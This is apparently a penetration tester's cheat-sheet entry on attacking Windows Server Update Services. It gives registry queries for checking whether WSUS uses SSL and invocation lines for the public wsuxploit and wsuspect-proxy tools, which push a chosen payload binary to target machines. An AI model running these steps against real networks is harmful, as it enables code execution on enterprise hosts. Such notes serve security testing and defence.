# Windows - WSUS

- https://www.contextis.com/en/resources/white-papers/wsuspect-compromising-the-windows-enterprise-via-windows-update

  

- Check to see if WSUS is using SSL or not

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer 

reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
```

## Exploitation

https://github.com/pimps/wsuxploit

```
./wsuxploit.sh <target_IP> <wsus_IP> <wsus_port> <binary path> 
```

https://github.com/ctxis/wsuspect-proxy



```
python wsuspect_proxy.py <payload> 
```

